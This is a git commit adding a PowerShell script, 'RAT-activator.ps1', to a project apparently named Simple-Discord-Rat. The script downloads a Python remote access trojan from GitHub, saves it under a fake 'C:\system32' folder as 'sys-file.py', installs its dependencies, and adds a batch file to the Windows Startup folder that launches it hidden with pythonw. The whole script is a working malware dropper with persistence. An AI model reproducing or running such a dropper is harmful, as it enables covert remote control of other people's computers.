93c0921fa5879d9f5584772a429bf45bde4048e1
simen64 <97337442+simen64@users.noreply.github.com>
2023-10-06 00:25:39 +0200

    NOT FINISHED just started working on it

---
+++ Simple-Discord-Rat/RAT-activator.ps1
@@ -0,0 +1,15 @@
+mkdir 'C:\system32\'
+
+cd C:\system32\
+
+iwr -Uri https://raw.githubusercontent.com/simen64/Simple-discord-RAT/main/Simple-Discord-RAT.py -OutFile C:\system32\sys-file.py
+
+py -m pip install discord.py requests
+
+'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path 'C:\system32\startup.bat'
+
+Copy-Item 'C:\system32\startup.bat' "$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+
+Python sys-file.py $dc
+
+pause
